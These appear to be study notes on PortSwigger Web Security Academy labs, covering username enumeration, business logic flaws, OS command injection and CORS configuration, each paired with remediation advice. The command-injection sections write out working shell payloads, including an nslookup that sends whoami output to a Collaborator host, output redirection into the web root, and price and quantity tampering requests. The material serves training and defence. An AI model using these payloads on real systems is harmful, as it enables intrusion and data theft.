Some applications fix the obvious enumeration oracles — identical error message, identical status code, identical response length — but still leak validity through time. A common login implementation looks roughly like:

1. Look up the username.
2. If found, hash the submitted password and compare it to the stored hash.
3. If not found, skip straight to "invalid credentials".

Step 2 (hashing and comparing) takes measurably longer than immediately returning an error in step 3. So a login attempt for a valid username consistently takes a little longer than one for an invalid username — even though both ultimately return the same error message.

docs.title: Amplifying the timing signal
docs.text: A password-hashing operation on a short input can be a matter of milliseconds, easily lost in ordinary network jitter. The signal can be amplified by submitting an unusually long password: many hashing routines take longer on longer input, which stretches the time difference between "hashed and compared" and "rejected immediately" to something measurable over many requests.

docs.title: Solution outline
docs.text:
1. Capture a POST /login request and send it to Intruder.
  2. Set a payload position on username, load the candidate-username wordlist, and set password to a single very long fixed value (to amplify any hashing-time difference).
  3. Run the attack with a payload type/attack configuration that reports response time per request (Burp's Intruder results include a response-time column; for a cleaner signal, send each candidate multiple times and compare average or median time rather than a single sample, since individual requests are noisy).
  4. Sort by response time. The valid username's requests cluster at a measurably higher time than the rest.
  5. Fix username to that value, move the payload position to password, and brute-force with the candidate-password wordlist as in the other enumeration labs.
  6. Identify the successful login (a redirect instead of another failed-login response) and log in to solve the lab.

docs.title: Why it works
docs.text: The branch that only runs for a valid username (hashing and comparing a password) has an execution cost that an invalid username's request never incurs. Any consistent, measurable difference in server-side work shows up as a timing difference in the response, regardless of how carefully the response content has been equalized.

docs.title: Remediation
docs.text:
• Perform the same amount of work on every login attempt, valid username or not — for example, always hash a dummy password (or the submitted one against a fixed dummy hash) even when the username does not exist, so the timing is constant.
  • Avoid branching logic that returns early for one case and performs expensive work only for the other.
  • Measure response times across valid/invalid accounts during testing; a passing text/status-code check does not rule out a timing side channel.
  • Combine with rate limiting and account lockout, since removing one oracle does not by itself prevent brute-forcing once a username is known through another channel.

docs.title: Username enumeration via subtly different responses
docs.text:
Lab: PortSwigger Web Security Academy — Username enumeration via subtly different responses (Practitioner).

This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, found in the candidate wordlists. To solve the lab, enumerate a valid username, brute-force that user's password, then access their account page.

docs.title: BASICS: when the difference is nearly invisible
docs.text: The previous username enumeration via different responses lab had an obvious tell: a visibly different message or status code. Real applications are often "fixed" just enough to remove the obvious difference while leaving a subtler one behind — a missing full stop, an extra space, a reordered word. Scanning hundreds of responses by eye for a one-character difference is impractical; the fix is to let Burp do the comparison.

docs.title: 1. Run the username brute-force
docs.text: Capture a failed login, send it to Intruder, set the payload position on username, and attack with the candidate-username list while leaving the password fixed.

docs.title: 2. Filter out the common error text
docs.text:
With hundreds of same-looking 200 responses, use Intruder's view filter to do a negative search: filter for responses that do not contain the generic error text (for example Invalid username or password.), with Negative search enabled.

Only the response(s) whose body text differs even slightly from that exact string remain visible — in this lab, one entry has a subtly different message (such as a different trailing character or capitalization), revealing the valid username.

docs.title: 3. Brute-force the password
docs.text: Fix the username parameter to the discovered value, move the payload position to password, and run a new Sniper attack with the candidate-password list.

docs.title: 4. Identify the successful login
docs.text: Sort by status code or length; the correct password produces a redirect instead of another login-page response.

docs.title: 5. Log in and solve the lab
docs.text: Submit the recovered credentials through the login form and open the account page.

docs.title: Why it works
docs.text: Removing an obvious behavioral difference does not guarantee the responses are byte-for-byte identical. Template whitespace, punctuation, capitalization, or ordering differences are easy to introduce by accident when two near-identical error paths are maintained separately in code, and Burp's response-diffing and filtering make even a single differing character trivial to isolate across a large result set.

docs.title: Remediation
docs.text:
• Generate the failure response from a single code path for every invalid-login reason, so there is no second template to drift out of sync.
  • Diff your own application's valid vs. invalid responses byte-for-byte during testing — do not rely on a visual read-through.
  • Combine this with rate limiting and account lockout, since removing the enumeration oracle does not by itself stop brute-forcing once a username is otherwise known.

docs.title: What is authentication?
docs.text:
Authentication is the process an application uses to verify the identity of a user or client. It is the first question asked at the front door of a protected application:

Who are you?

This page explains the difference between authentication and authorization, the main causes of authentication vulnerabilities, their possible impact, and the risks around password-based login. It is written as a foundation for understanding later web application testing topics.

docs.title: 1. Authentication: the basic definition
docs.text:
Authentication is identity verification. The application receives a claim from a user or client and checks whether the claim matches the expected identity.

Part What it means Process Verifying the identity of a user or client. Need Essential for web security because internet-facing applications are exposed to unknown users and automated attempts. Factors The identity claim can be based on knowledge, possession or inherence.

A password is an example of a knowledge factor: the system assumes that the person who knows the secret is the account owner. That assumption is only useful while the secret remains protected and the application checks it correctly.

docs.title: 2. Authentication versus authorization
docs.text:
Authentication and authorization are related, but they answer different questions and happen at different points in the access decision.

Concept Question Example What it does Authentication “Who are you?” Is Carlos123 really Carlos? Verifies that a user's claim matches the actual identity associated with the account. Authorization “What can you do?” Can Carlos delete accounts or view another user's data? Determines which actions and data are allowed after the identity has been authenticated.

docs.title: A simple way to remember the difference
docs.text:
1. Authentication comes first: the application verifies the identity.
  2. Authorization follows: the application decides what that identity is allowed to do.
  3. A correct first step does not guarantee a correct second step: an application can authenticate Carlos correctly and still give him access to data or functions he should not have.

docs.title: 3. The two main causes of authentication vulnerabilities
docs.text: Authentication problems generally come from one of two broad causes.

docs.title: Cause 1: Weak mechanisms
docs.text:
A weak mechanism still attempts to authenticate the user, but does not protect the process well enough. The main issue is inadequate protection against brute-force attacks.

Examples include:

  • No rate limiting or other brute-force protection.
  • Weak passwords being accepted.

In this case, the authentication process may be present, but an attacker can make too many guesses or take advantage of passwords that are easy to predict.

docs.title: Cause 2: Logic flaws and implementation bugs
docs.text:
A logic flaw is different: the attacker may be able to bypass authentication entirely instead of merely guessing a password more efficiently.

This is commonly described as broken authentication. It can be caused by poor coding or logical errors in the way the application implements login and identity checks.

Critical insight

Broken authentication means logic flaws allow a complete authentication bypass. It is not limited to weak password protection.

docs.title: 4. Why vulnerable authentication matters
docs.text: The severity of an authentication vulnerability can be extreme because authentication is the boundary protecting accounts, data and application functions.

docs.title: Account compromise
docs.text: If an attacker obtains or bypasses authentication, they may gain access to a victim's data and account functions. The result depends on what that account can reach.

docs.title: Privilege escalation
docs.text:
A compromised low-privilege account may provide a path toward higher-privilege accounts. The important question is not only “Can one account be accessed?” but also “What can be reached from inside that account?”

Account type Possible impact Administrator account Full application control and potential access to internal infrastructure. Low-privilege account Access to commercial or business information, internal pages and additional attack surfaces that may create escalation opportunities.

docs.title: Every account matters
docs.text: A low-privilege account is not automatically harmless. It can expose information, reveal internal functionality and provide a starting point for finding additional weaknesses. That is why authentication testing should consider the whole account lifecycle and not only administrator login.

docs.title: 5. Password-based login vulnerabilities
docs.text:
Password-based authentication uses a username and a secret password. Its central assumption is:

Knowing the password is proof of the user's identity.

That assumption fails when an attacker obtains or guesses the credentials, or when the application does not enforce the check correctly.

docs.title: Brute-force attacks
docs.text:
A brute-force attack is a systematic, trial-and-error attempt to guess credentials. It is commonly automated with lists of usernames and passwords and tools designed to send attempts quickly.

The risk is high when the application has little or no brute-force protection. The practical difficulty depends on the strength of the password and the rules the application enforces.

docs.title: Username brute-forcing
docs.text:
Before guessing passwords, an attacker may try to identify valid usernames. Usernames are often easier to predict than passwords.

Common patterns include:

  • Email addresses such as firstname.lastname@company.com.
  • Common names such as admin, administrator and root.

Possible sources for username discovery include:

  • Public user profiles, where a person's name may match their username.
  • HTTP responses that reveal administrator email addresses or other account details.
  • Registration forms that reveal whether a username has already been taken.

docs.title: Password brute-forcing
docs.text:
The difficulty of guessing a password depends on its strength and the password policy. Policies commonly require a minimum length, mixed-case letters and special characters, but a policy does not automatically create unpredictable passwords.

Users often make predictable changes to simple passwords in order to satisfy a policy. For example:

  • mypassword becomes Mypassword1!.
  • Mypassword1! becomes Mypassword2?.
  • A password change uses another predictable variation of the previous password.

These patterns can make brute-force attempts more efficient because the attacker is not guessing every possible password equally; they are prioritizing common human transformations.

docs.title: Username enumeration
docs.text:
Username enumeration is the process of identifying which usernames are valid by analyzing how the application behaves.

Common places to look for this behavior include:

  • The login page, when a valid username and an incorrect password produce a different result from an invalid username.
  • Registration forms, when the application says that a username is already taken.

The application may reveal validity through status codes, error messages or response timing.

docs.title: Status code differences
docs.text: If valid and invalid usernames produce different HTTP status codes, that difference can reveal which usernames exist. Ideally, the application should use the same status code for all outcomes, although this is not always implemented.

docs.title: Error message variations
docs.text:
Different messages can also reveal validity. For example:

  • Invalid username or password when both values are wrong.
  • Invalid password when the username is valid but the password is wrong.

Even small differences—such as a typo, an extra space or different punctuation—can disclose the result.

docs.title: Response time analysis
docs.text:
Response timing can leak the same information. A valid username may take slightly longer because the application performs an additional password check after finding the account. An unusually long password can amplify the timing difference.

Timing is not proof by itself. It must be measured carefully because normal network variation can create noise.

docs.title: 6. The common attack strategy
docs.text:
When these weaknesses appear together, the overall strategy is usually:

  1. Enumerate valid usernames by observing behavior differences.
  2. Reduce the attack space to a shorter list of known valid usernames.
  3. Brute-force passwords for the known valid usernames.

This is why username enumeration matters even when no password has been exposed: it makes the next stage more focused.

docs.title: 7. The human pattern behind password risk
docs.text:
Password policies often encourage users to transform simple passwords instead of creating entirely new secrets. A password may gain a capital letter, a number or a special character while keeping the same predictable base.

The security lesson is simple: a password can technically satisfy a policy and still be easy to predict. Strong protection therefore depends on more than the visible password rules; it also depends on how the application limits guessing and how consistently it protects account behavior.

docs.title: Key relationships
docs.text:
1. Authentication → Authorization: first verify identity, then determine permissions.
  2. Weakness → Impact: flaws can lead to different levels of compromise, from easier guessing to complete bypass.
  3. Every account matters: even a low-privilege account can provide a foothold and expose more attack paths.

docs.title: Summary
docs.text:
• Authentication verifies who a user or client is.
  • Authorization decides what that authenticated identity can do.
  • Weak mechanisms make guessing easier; logic flaws can allow authentication to be bypassed completely.
  • Broken authentication is therefore a high-impact class of issue, especially when a privileged account can be reached.
  • Username enumeration reduces the work needed for password brute-forcing.
  • Human password patterns can make policy-compliant passwords predictable.

docs.title: Business Logic Vulnerabilities
docs.text:
Business logic vulnerabilities are flaws in the design and implementation of an application's rules — the way it is supposed to behave — that let an attacker reach an outcome the designers never intended. Nothing is "injected" and no memory is corrupted. The attacker simply uses legitimate features in an unexpected way: ordering a negative quantity, skipping a step, changing a price, or combining two valid actions into an invalid one.

Because each flaw is specific to how a particular application works, there is no payload list and automated scanners rarely find them. Finding them is about understanding the intended workflow and then breaking its assumptions.

docs.title: Why they happen
docs.text:
Logic flaws appear when developers make assumptions about how users will behave, and then fail to enforce those assumptions on the server:

  • "Users will only submit values the form allows."
  • "Users will complete the steps in order."
  • "This value in the request came from us, so it can be trusted."
  • "Nobody will enter a number that large (or negative)."

Each assumption is true for an honest user with a browser, and false for anyone using a proxy such as Burp.

docs.title: Excessive trust in client-side controls
docs.text: The server relies on checks done in the browser: a price sent in a hidden field, a maximum length in HTML, a quantity limit in JavaScript. All of that is under the attacker's control. Any value that matters (price, role, discount, user ID) must be taken from server-side data, not from the request.

docs.title: Flawed assumptions about user input
docs.text:
Applications assume that inputs are within a "reasonable" range. Two classic failures:

  • High-level flaws — the logic of the workflow is wrong, for example accepting a negative quantity, which turns a purchase into a credit.
  • Low-level flaws — the implementation is wrong, for example an integer that overflows when a total gets large enough, wrapping from a huge positive value to a negative one.

docs.title: Flawed assumptions about user behaviour
docs.text: Applications assume users will follow the intended path: log in, then verify, then continue. If the server does not track state, an attacker can skip or repeat steps, drop parameters, or replay requests out of order. Broken two-factor flows are a common example.

docs.title: Domain-specific flaws
docs.text: Pricing, discounts, loyalty points, refunds and inventory all have rules specific to the business. Stacking discount codes, applying the same code twice, or exploiting rounding errors are bugs of this kind.

docs.title: How to find them
docs.text:
1. Learn the workflow first. Use the application as intended and write down every step, every parameter and every rule you can observe.
  2. Ask what the developer assumed. For each parameter, what happens if it is negative, zero, huge, missing, duplicated, or from another user?
  3. Test the boundaries and the order. Skip steps, repeat steps, change the value mid-flow.
  4. Watch the server's responses, not just the page — totals, store credit and order confirmations show whether your abuse was accepted.

Proxy everything

Business logic testing is mostly done in Burp Repeater: capture the request that carries the business value (price, quantity, step number) and change it.

docs.title: Impact
docs.text:
• Financial loss — free or underpriced goods, stolen store credit, refund abuse.
  • Authentication and authorization bypass — skipped 2FA, forged account state.
  • Integrity of data — corrupted inventory, orders or balances.
  • Often hard to detect after the fact, because every request looks like normal use.

docs.title: How to prevent them
docs.text:
1. Never trust the client for business values. Price, discount, role and totals must come from server-side data.
  2. Validate on the server — allowed ranges, types, sign and size — and reject anything outside them, including negative and very large numbers.
  3. Enforce workflow state on the server. Record which step a session has completed and refuse out-of-order requests.
  4. Write down the assumptions during design, then write tests that violate each one.
  5. Check arithmetic limits. Use types that cannot overflow for money, or check bounds before calculating.
  6. Log and monitor unusual flows (large quantities, negative totals) so abuse is visible.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • Excessive trust in client-side controls
  • High-level logic vulnerability
  • Low-level logic flaw

2FA broken logic

A fourth lab, 2FA broken logic, was only partly worked in the source notes (login and the intercepted request, which sets a verify=carlos cookie that the second step trusts). It is not published as a walkthrough here. The idea is covered above under flawed assumptions about user behaviour: the verification step identifies the user from a cookie the client can change.

docs.title: Excessive trust in client-side controls
docs.text:
Lab: PortSwigger Web Security Academy — Excessive trust in client-side controls (Apprentice).

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket". Credentials: wiener:peter.

The shop shows a price in the interface, but that is not where the price is decided. When you add an item to the cart, the browser sends the price back to the server as a parameter, and the server uses it. A value the user can edit has become the source of truth.

docs.title: 1. Find the target item
docs.text:
Log in as wiener and open the Lightweight "l33t" Leather Jacket, priced at $1337.00 — far more than the account's store credit.

Open the product page and add it to the cart while Burp is intercepting.

docs.title: 2. Read the add-to-cart request
docs.text:
The request contains the price in the body:

POST /cart HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&redir=PRODUCT&quantity=1&price=133700

The price is in cents (133700 = $1337.00).

docs.title: 3. Tamper with the price
docs.text:
Send it to Repeater and change price to 1:

productId=1&redir=PRODUCT&quantity=1&price=1

The server accepts it and answers with a normal 302 back to the product page.

docs.title: 4. Check the cart and buy
docs.text:
Open the cart. The jacket is there for $0.01:

Place the order. The confirmation lists the jacket at its normal catalogue price but charges a total of $0.01, and the lab is solved.

docs.title: Why the attack works
docs.text: The server trusts a price sent from the client instead of looking it up from its own product table. Anything in a request (hidden fields, cookies, JSON bodies) is attacker-controlled.

docs.title: Remediation
docs.text: Never accept prices, discounts or totals from the client. Take only the product ID and quantity, then read the price from the server-side catalogue when the cart is built and again when the order is placed.

docs.title: High-level logic vulnerability
docs.text:
Lab: PortSwigger Web Security Academy — High-level logic vulnerability (Apprentice).

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket". Credentials: wiener:peter.

A high-level flaw is a mistake in the rules of the workflow rather than in how a number is stored. Here the shop never asks whether a quantity should be negative. A negative quantity gives a negative line total, and the order total is just the sum of all lines, so one item can subsidise another.

docs.title: 1. Check your budget
docs.text:
Log in as wiener. The account has $100.00 store credit; the jacket costs $1337.00.

Normal behaviour first: add the jacket and another item, and check the cart.

docs.title: 2. Capture the add-to-cart request
docs.text:
Add a cheaper item (a Gym Suit) to the cart and send the request to Repeater. The quantity is a body parameter:

POST /cart HTTP/2

productId=5&redir=PRODUCT&quantity=27

docs.title: 3. Use a negative quantity
docs.text:
The site's UI stops you going below zero by button, but the server does not check. Send a negative quantity for the cheap item so that it offsets the jacket's price, adjusting until the total is below the store credit:

productId=5&redir=PRODUCT&quantity=-13

The cart now shows the jacket at 1 and the Gym Suit at -13, with a total of $64.95, which fits inside the $100 credit.

docs.title: 4. Place the order
docs.text: The order succeeds. The jacket is purchased, store credit drops from $100.00 to $35.05, and the lab is solved.

docs.title: Why the attack works
docs.text: The application assumed users would only enter positive quantities. Because that assumption is only enforced in the UI, a direct request can break it. The negative line item reduces the grand total.

docs.title: Remediation
docs.text: Validate quantity on the server: it must be a positive integer within a sensible upper bound. Reject the request otherwise. Also check that the order total cannot be less than the sum of the real prices of the items.

docs.title: Low-level logic flaw
docs.text:
Lab: PortSwigger Web Security Academy — Low-level logic flaw (Practitioner).

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket". Credentials: wiener:peter.

Unlike the high-level lab, the logic here is correct (negative quantities are rejected). The flaw is in the implementation: the cart total is stored in a signed integer that has a maximum value. When the total grows past it, the number wraps around to a large negative one. By buying a huge quantity you can drive the total negative, and then bring it back up to a small positive amount.

Integer overflow

A signed 32-bit integer tops out at 2,147,483,647. Adding 1 more produces -2,147,483,648. Prices are often kept in cents, so a $1337.00 jacket is 133700, and enough of them overflow the total.

docs.title: 1. Log in and capture the add-to-cart request
docs.text:
Log in as wiener:peter and add the jacket to the cart, sending the POST /cart request to Burp.

The server limits the quantity per request (to two digits, so at most 99) but does not limit how many times you can add the same item.

docs.title: 2. Make the total overflow
docs.text: Send the add-to-cart request to Intruder, set quantity to 99, and use a Null payloads attack with continuous (many, around 300+) repeats with a single thread. Each request adds 99 jackets to the cart. Watch the cart total grow, hit the 32-bit limit, and wrap to a negative number.

docs.title: 3. Tune the total to a small positive number
docs.text: Once the total is negative, add a calculated number of the jacket (or another item) so the total climbs back toward zero. Aim for a positive total that is below your store credit ($100.00). A small adjustment with a cheaper item makes it precise.

docs.title: 4. Place the order
docs.text:
Place the order with the total below the store credit. The purchase is accepted, and the lab is solved.

About this walkthrough

The source notes for this lab only contain the lab login screen. The exploitation steps above follow the lab's intended solution rather than recorded screenshots; the exact request counts depend on the product prices in your lab instance.

docs.title: Why the attack works
docs.text: The application checks that each quantity is positive and small, but never checks the running total for overflow. Arithmetic that silently wraps turns a very large order into a very cheap one.

docs.title: Remediation
docs.text: Use a data type that cannot overflow for money (a wide integer or decimal) and validate the total against a reasonable maximum before saving. Cap the total quantity per item and per order, not only per request.

docs.title: OS Command Injection
docs.text: OS command injection (also called shell injection) is a vulnerability where an application passes attacker-controlled input into a command that the operating-system shell executes. Because the shell interprets certain characters as syntax rather than data, an attacker can append their own commands to the one the developer intended — and the server runs them with the privileges of the web application. This usually means full compromise of the application and often a foothold on the wider network.

docs.title: Before command injection: how the OS shell parses a command
docs.text: The bug only makes sense once you know what a shell does with a line of text.

docs.title: The app runs a command built from input
docs.text:
Many applications shell out to system utilities. A shopping site might check stock by running a helper script:

stockreport.pl 381 29

If the two numbers come from a URL like ?productID=381&storeID=29, the developer may build the command by concatenation:

command = "stockreport.pl " + productID + " " + storeID

docs.title: Shell metacharacters are syntax, not text
docs.text:
When that string reaches a shell, the shell scans it for metacharacters before running anything. Several of them let you start a second command:

Character Meaning in the shell ; Run the next command after this one (Unix) & Run commands; & backgrounds / separates them && Run the next command only if the previous succeeded \| Pipe output of one command into the next \|\| Run the next command only if the previous failed ` or $( ) Command substitution — run the inner command and insert its output \n Newline — a fresh command line

So if an attacker sets productID to 381;whoami, the shell sees two commands:

stockreport.pl 381;whoami 29

It runs the stock report, then runs whoami. The username appears in the response — proof that injected commands execute.

Why wrap payloads in separators

A common pattern is & injected-command & or || injected-command ||. The leading separator ends the original command cleanly, and the trailing one swallows whatever the application appended after your input, so the injected command is isolated and far more likely to run.

docs.title: When output is returned (in-band)
docs.text:
Inject a separator plus a harmless command whose output you can recognise:

& echo INJECTEDc0ffee &

If INJECTEDc0ffee appears in the response, injection is confirmed. whoami, id, and uname -a are the usual next steps.

docs.title: When output is not returned (blind)
docs.text:
Many endpoints execute the command but never show its output. You then infer execution indirectly. Three techniques, in the order you usually try them:

Technique How it confirms Best when Time delay (ping -c 10 127.0.0.1, sleep 10) Response is noticeably slower First, simplest check Output redirection (whoami > /var/www/images/out.txt) You fetch the written file over HTTP A writable, web-served directory exists Out-of-band / OAST (nslookup x.collaborator.net) A DNS/HTTP hit arrives at your listener No delay signal and no readable output

With OAST you can even exfiltrate data: embed a command's output in the hostname you look up — nslookup \whoami`.collaborator.net` — and read the username from the DNS subdomain your server received.

docs.title: Why it matters — impact
docs.text:
Running OS commands as the web application is severe:

  • Full server compromise — read/write any file the service user can access, including configuration and secrets.
  • Lateral movement — pivot to internal systems by abusing trust relationships and stored credentials.
  • Data theft and destruction — exfiltrate databases, plant web shells, deploy ransomware.
  • Persistence — add users, cron jobs, or backdoors.

docs.title: How to prevent it
docs.text:
1. Do not call the shell with user input at all. This is the only robust fix. Use language APIs that perform the task directly (file operations, HTTP libraries) instead of shelling out.
  2. If you must run a process, use a parameterised API that passes arguments as a list — subprocess.run(["stockreport.pl", productID, storeID]) — so the shell never re-parses them and metacharacters stay inert.
  3. Validate against a strict allow-list where the input domain is known (e.g. a numeric product ID). Never try to "escape" dangerous characters as your primary defence.
  4. Run with least privilege so that even a successful injection is contained.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • OS command injection, simple case
  • Blind OS command injection with time delays
  • Blind OS command injection with output redirection
  • Blind OS command injection with out-of-band interaction
  • Blind OS command injection with out-of-band data exfiltration

docs.title: Blind OS command injection with out-of-band data exfiltration
docs.text:
Lab: PortSwigger Web Security Academy — Blind OS command injection with out-of-band data exfiltration (Practitioner).

The feedback function runs a shell command containing the user-supplied details. The command runs asynchronously, has no effect on the response, and its output cannot be redirected to a readable location. The goal is to run whoami and exfiltrate the output via a DNS query to Burp Collaborator.

docs.title: 1. The idea: smuggle output into a hostname
docs.text: With pure OAST you can prove execution, but here you also need to read a value. The trick is to put the command's output inside the hostname you look up. DNS resolution sends that hostname to the Collaborator server, so the username appears as a subdomain in the interaction log.

docs.title: 2. Build the exfiltration payload
docs.text:
Intercept the feedback request, send it to Repeater, and set the email parameter to:

email=||nslookup+`whoami`.abc123.oastify.com||
  • `whoami` is command substitution — the shell runs whoami first and replaces the backticks with its output.
  • that output is prepended as a subdomain of your Collaborator domain.
  • nslookup then resolves <username>.abc123.oastify.com, sending the username to your server.

docs.title: 3. Read the username from the DNS interaction
docs.text:
Poll Collaborator. The incoming DNS lookup's hostname contains the output of whoami as its leftmost label:

peter-xxxx.abc123.oastify.com

Enter the recovered username to solve the lab:

docs.title: Why the attack works
docs.text: Command substitution evaluates whoami before nslookup runs, so the username becomes part of the DNS query. Because resolvers forward the full hostname to the authoritative server (your Collaborator), the data rides out over DNS even though the application never returns any output and the command runs asynchronously. This same channel can be looped to extract larger values character by character.

docs.title: Remediation
docs.text: Do not build shell commands from user input; use a parameterised process API and validate the email field. Blocking or tightly monitoring outbound DNS limits OAST exfiltration as defence in depth.

docs.title: Blind OS command injection with out-of-band interaction
docs.text:
Lab: PortSwigger Web Security Academy — Blind OS command injection with out-of-band interaction (Practitioner).

The feedback function runs a shell command containing the user-supplied details. The command runs asynchronously and has no effect on the response, and you cannot redirect output to a readable location. The goal is to exploit the blind injection to issue a DNS lookup to Burp Collaborator.

docs.title: 1. Why in-band and timing fail here
docs.text: The command is executed asynchronously, so there is no measurable delay in the HTTP response, and there is no writable web-served directory to redirect output into. The remaining reliable signal is an out-of-band (OAST) network interaction: make the server reach out to infrastructure you control.

docs.title: 2. Generate a Collaborator payload
docs.text: In Burp, open Collaborator and click Copy to clipboard to get a unique subdomain such as abc123.oastify.com. Any DNS or HTTP request to it is logged and attributed to you.

docs.title: 3. Inject an nslookup payload
docs.text:
Intercept the feedback request, send it to Repeater, and set the email parameter to a command that resolves your Collaborator domain:

email=||nslookup+abc123.oastify.com||
  • || runs our command after the preceding one fails.
  • nslookup performs a DNS lookup of the given hostname.
  • the Collaborator subdomain is the hostname the server will resolve.
  • trailing || isolates the payload.

docs.title: 4. Confirm the interaction
docs.text: Back in the Collaborator tab, poll for interactions. A DNS lookup arriving from the target confirms the server executed your command:

docs.title: Why the attack works
docs.text: Even when output is discarded and execution is asynchronous, the injected command still runs. Forcing a DNS lookup produces evidence outside the application: the request lands on your Collaborator server. DNS is rarely blocked outbound, so this is one of the most reliable ways to prove blind code execution.

docs.title: Remediation
docs.text: Do not construct shell commands from user input; use a parameterised process API and validate the email field. Restricting the server's outbound DNS/network access provides defence in depth against OAST-based confirmation and exfiltration.

docs.title: Blind OS command injection with output redirection
docs.text:
Lab: PortSwigger Web Security Academy — Blind OS command injection with output redirection (Practitioner).

The feedback function runs a shell command containing the user-supplied details, and its output is not returned in the response. However, there is a writable folder at /var/www/images/ from which the application serves product images. The goal is to run whoami and retrieve its output.

docs.title: 1. Understand how images are served
docs.text: Product images load via a request like GET /image?filename=63.jpg, and the application reads that file from /var/www/images/. That directory is both writable by the command and reachable over HTTP — the perfect place to drop output.

docs.title: 2. Redirect the command output to a file
docs.text:
Intercept the feedback request, send it to Repeater, and set the email parameter to:

email=||whoami>/var/www/images/output.txt||
  • || ensures our command runs after the preceding one fails.
  • whoami produces the username.
  • > redirects that output into output.txt inside the web-served images folder (overwriting if it exists).
  • trailing || isolates the payload.

docs.title: 3. Retrieve the written file
docs.text:
Now request the file you created through the image loader:

GET /image?filename=output.txt

The response body contains the output of whoami:

Submitting that value solves the lab:

docs.title: Why the attack works
docs.text: The command runs with permission to write into a directory that the web server also exposes. Redirecting stdout with > turns an otherwise blind vulnerability into a readable one: you convert "command executed, output hidden" into "output saved to a file I can download". The key requirement is a path that is both writable by the service and web-accessible — here, the image directory.

docs.title: Remediation
docs.text: Do not shell out with user input; use a parameterised process API and validate the email field. Separately, the upload/image directory should not permit arbitrary file creation by the application's command context, and web-served directories should not be writable by request-handling code.

docs.title: Blind OS command injection with time delays
docs.text:
Lab: PortSwigger Web Security Academy — Blind OS command injection with time delays (Practitioner).

The feedback function runs a shell command containing the submitted details, but the command's output is not returned in the response. The goal is to confirm the vulnerability by exploiting the blind injection to cause a time delay.

docs.title: 1. Locate the blind sink
docs.text: Use Submit feedback and intercept the request in Burp. It contains the usual fields (name, email, subject, message). The server passes these to a mail command, but you never see its output — this is blind injection.

docs.title: 2. Inject a time-delay payload
docs.text:
Send the request to Repeater and change the email parameter to a payload that forces a pause:

email=x||ping+-c+10+127.0.0.1||

Breaking down the payload:

  • x — a harmless value that makes the preceding command fail (non-zero exit).
  • || — "run the next command only if the previous one failed", so our command runs.
  • ping -c 10 127.0.0.1 — pings the loopback address 10 times, which takes roughly 10 seconds.
  • trailing || — isolates the payload from whatever the application appends afterwards.

+ is the URL-encoded space, required because the value sits in a URL-encoded body.

docs.title: 3. Observe the delay
docs.text: Compare response times. A normal submission returns almost instantly; the injected one takes about 10 seconds, confirming the command executed.

docs.title: Why the attack works
docs.text: Even though output is discarded, the command still runs, and ping -c 10 makes its execution observable through timing. ping is ideal here: it exists on both Linux and Windows, the count flag gives precise control over the delay, and pinging localhost needs no outbound network access, so it works in locked-down environments.

docs.title: Remediation
docs.text: As with all command injection, do not pass user input to a shell. Build the mail invocation with a parameterised process API and validate the email address format. A strict allow-list for the email field would reject x||ping...|| outright.

docs.title: OS command injection, simple case
docs.text:
Lab: PortSwigger Web Security Academy — OS command injection, simple case (Apprentice).

The stock-checker feature executes a shell command containing user-supplied product and store IDs, and returns the command's raw output in the response. The goal is to run the whoami command.

docs.title: 1. Find the shell-backed feature
docs.text:
Open any product and use Check stock. The browser sends a POST /product/stock request whose body carries the two IDs:

POST /product/stock HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1

Server-side, these values are concatenated into a shell command similar to stockreport.sh 1 1.

docs.title: 2. Inject a command separator
docs.text:
Intercept the request in Burp and send it to Repeater. Append a shell separator and whoami to one of the parameters. Using ; to chain a second command:

productId=;whoami&storeId=1

(The | separator works too — e.g. storeId=1|whoami — because it pipes the first command's output into whoami.)

docs.title: 3. Read the output
docs.text:
The response returns the output of the injected command directly. Here the shell errors on the empty product ID and then runs whoami, whose result appears in the body:

Submitting the payload through the application solves the lab:

docs.title: Why the attack works
docs.text: The application builds the shell command by joining fixed text with the request parameters and hands the whole string to a shell. The shell treats ; (or |) as command syntax, so the attacker's whoami runs as a separate command and its output is returned verbatim — the input was interpreted as code, not data.

docs.title: Remediation
docs.text:
Avoid invoking a shell. Call the stock routine through an API that takes arguments as a list, so metacharacters are passed literally:

subprocess.run(["stockreport.sh", product_id, store_id])  # no shell parsing

Additionally validate that productId and storeId are integers before use.

docs.title: CORS: prevention and secure configuration
docs.text: CORS vulnerabilities are almost always misconfigurations, not bugs in the browser's CORS implementation. Prevention is therefore a configuration discipline: decide exactly which origins genuinely need cross-origin, credentialed access, and refuse everyone else.

docs.title: 1. Specify exact, trusted origins
docs.text:
If a resource contains sensitive data, Access-Control-Allow-Origin must name the specific origins that are allowed to read it — never a pattern that matches more than intended.

Access-Control-Allow-Origin: https://partner.example.com
Access-Control-Allow-Credentials: true

Avoid:

Access-Control-Allow-Origin: *

A wildcard combined with credentials is rejected by browsers, but a server that dynamically reflects whatever Origin header it receives achieves the same effect manually — and that is the single most common root cause of exploitable CORS. See CORS vulnerability with basic origin reflection for what happens when a server does this.

docs.title: 2. Never whitelist the null origin
docs.text:
Access-Control-Allow-Origin: null is sometimes added because the server observed Origin: null once and treated it as "no origin, so harmless." In reality, null is a request's Origin in several attacker-controllable situations:

  • Sandboxed <iframe>s (sandbox without allow-same-origin).
  • Documents loaded from the local filesystem (file://).
  • Some redirects and serialized data: URLs.

An attacker who controls none of your real domains can still produce a request with Origin: null, so trusting it is equivalent to trusting anyone. See CORS vulnerability with trusted null origin.

docs.title: 3. Match the full origin, not just the hostname
docs.text:
An origin is scheme + host + port. A suffix or wildcard match on the hostname alone (*.example.com) silently trusts every subdomain and every protocol on those subdomains:

  • Any subdomain with an XSS bug can act as a trusted origin.
  • An http:// subdomain can be trusted alongside the https:// main site, exposing it to network-level tampering.

